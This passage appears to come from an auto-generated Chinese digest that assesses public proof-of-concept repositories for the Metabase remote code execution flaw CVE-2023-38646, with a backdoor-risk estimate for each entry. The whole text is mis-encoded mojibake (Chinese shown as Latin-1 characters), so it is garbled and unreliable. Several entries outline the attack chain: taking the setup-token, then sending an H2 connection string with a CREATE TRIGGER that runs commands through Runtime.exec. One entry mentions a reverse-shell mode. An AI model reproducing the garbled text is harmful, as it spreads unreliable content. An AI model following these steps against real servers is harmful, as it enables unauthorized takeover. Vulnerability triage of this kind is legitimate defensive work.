**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
